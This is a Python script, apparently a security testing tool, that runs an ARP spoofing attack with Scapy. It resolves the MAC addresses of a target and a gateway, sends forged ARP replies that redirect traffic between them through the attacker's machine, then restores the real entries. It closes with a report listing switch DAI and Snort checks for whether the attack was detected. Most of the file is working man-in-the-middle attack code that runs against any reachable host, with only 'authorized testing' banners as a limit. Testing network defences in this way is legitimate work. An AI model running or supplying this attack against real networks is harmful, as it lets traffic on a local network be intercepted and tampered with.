#!/usr/bin/env python3
"""
ARP Spoofing Attack Simulation Agent — AUTHORIZED TESTING ONLY
Simulates ARP spoofing attacks using Scapy in controlled lab environments
to test network detection capabilities and validate DAI countermeasures.

WARNING: Only use with explicit written authorization on isolated test networks.
"""

import json
import sys
import time
from datetime import datetime, timezone

from scapy.all import ARP, Ether, sendp, srp, conf, get_if_list, get_if_hwaddr


def get_mac(ip: str, iface: str) -> str:
    """Resolve MAC address for a given IP using ARP request."""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=3, verbose=False, iface=iface,
    )
    if ans:
        return ans[0][1].hwsrc
    return None


def scan_network(network_cidr: str, iface: str) -> list[dict]:
    """Scan local network segment to discover active hosts."""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_cidr),
        timeout=5, verbose=False, iface=iface,
    )
    hosts = []
    for sent, received in ans:
        hosts.append({
            "ip": received.psrc,
            "mac": received.hwsrc,
            "responded": True,
        })
    return hosts


def craft_arp_poison_packets(
    target_ip: str, target_mac: str,
    gateway_ip: str, gateway_mac: str,
    attacker_mac: str,
) -> tuple:
    """Craft ARP poison packets for target and gateway."""
    target_packet = Ether(dst=target_mac) / ARP(
        op="is-at",
        psrc=gateway_ip,
        hwsrc=attacker_mac,
        pdst=target_ip,
        hwdst=target_mac,
    )

    gateway_packet = Ether(dst=gateway_mac) / ARP(
        op="is-at",
        psrc=target_ip,
        hwsrc=attacker_mac,
        pdst=gateway_ip,
        hwdst=gateway_mac,
    )

    return target_packet, gateway_packet


def send_arp_poison(
    target_pkt, gateway_pkt, iface: str, count: int = 5, interval: float = 2.0
) -> dict:
    """Send ARP poison packets and log the activity."""
    results = {"packets_sent": 0, "start_time": "", "end_time": ""}
    results["start_time"] = datetime.now(timezone.utc).isoformat()

    for i in range(count):
        sendp(target_pkt, iface=iface, verbose=False)
        sendp(gateway_pkt, iface=iface, verbose=False)
        results["packets_sent"] += 2
        if i < count - 1:
            time.sleep(interval)

    results["end_time"] = datetime.now(timezone.utc).isoformat()
    return results


def restore_arp(
    target_ip: str, target_mac: str,
    gateway_ip: str, gateway_mac: str,
    iface: str,
) -> None:
    """Restore legitimate ARP entries to undo spoofing."""
    restore_target = Ether(dst=target_mac) / ARP(
        op="is-at",
        psrc=gateway_ip,
        hwsrc=gateway_mac,
        pdst=target_ip,
        hwdst=target_mac,
    )
    restore_gateway = Ether(dst=gateway_mac) / ARP(
        op="is-at",
        psrc=target_ip,
        hwsrc=target_mac,
        pdst=gateway_ip,
        hwdst=gateway_mac,
    )

    for _ in range(5):
        sendp(restore_target, iface=iface, verbose=False)
        sendp(restore_gateway, iface=iface, verbose=False)
        time.sleep(0.5)


def verify_detection(expected_alerts: list[str]) -> dict:
    """Verify that security controls detected the ARP spoofing attempt."""
    return {
        "expected_detections": expected_alerts,
        "note": "Check IDS/IPS alerts, SIEM events, and switch DAI logs for ARP anomaly detections",
        "check_commands": [
            "show ip arp inspection statistics  # Cisco switch DAI",
            "show ip arp inspection log  # DAI violation log",
            "grep 'arp' /var/log/snort/alert  # Snort ARP alerts",
        ],
    }


def generate_report(
    hosts: list, target_ip: str, gateway_ip: str,
    send_results: dict, detection: dict,
) -> str:
    """Generate ARP spoofing simulation report."""
    lines = [
        "ARP SPOOFING ATTACK SIMULATION REPORT — AUTHORIZED TESTING ONLY",
        "=" * 65,
        f"Date: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}",
        "",
        f"Network Hosts Discovered: {len(hosts)}",
        f"Target: {target_ip}",
        f"Gateway: {gateway_ip}",
        "",
        "SIMULATION RESULTS:",
        f"  Packets Sent: {send_results['packets_sent']}",
        f"  Start: {send_results['start_time']}",
        f"  End: {send_results['end_time']}",
        "",
        "DETECTION VERIFICATION:",
    ]
    for cmd in detection["check_commands"]:
        lines.append(f"  $ {cmd}")

    return "\n".join(lines)


if __name__ == "__main__":
    print("[!] ARP SPOOFING SIMULATION — AUTHORIZED TESTING ONLY")
    print("[!] Ensure you have written authorization before proceeding.\n")

    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <target_ip> <gateway_ip> <interface>")
        print(f"  Example: {sys.argv[0]} 192.168.1.100 192.168.1.1 eth0")
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    iface = sys.argv[3]
    count = int(sys.argv[4]) if len(sys.argv) > 4 else 5

    print(f"[*] Resolving MAC addresses on {iface}...")
    target_mac = get_mac(target_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)
    attacker_mac = get_if_hwaddr(iface)

    if not target_mac or not gateway_mac:
        print("[!] Could not resolve MAC addresses. Ensure hosts are reachable.")
        sys.exit(1)

    print(f"[*] Target: {target_ip} ({target_mac})")
    print(f"[*] Gateway: {gateway_ip} ({gateway_mac})")
    print(f"[*] Attacker: {attacker_mac}")

    target_pkt, gw_pkt = craft_arp_poison_packets(
        target_ip, target_mac, gateway_ip, gateway_mac, attacker_mac
    )

    print(f"[*] Sending {count} ARP poison rounds...")
    results = send_arp_poison(target_pkt, gw_pkt, iface, count=count)

    print("[*] Restoring ARP tables...")
    restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface)

    detection = verify_detection(["DAI violation", "ARP anomaly IDS alert", "SIEM ARP event"])
    report = generate_report([], target_ip, gateway_ip, results, detection)
    print(report)
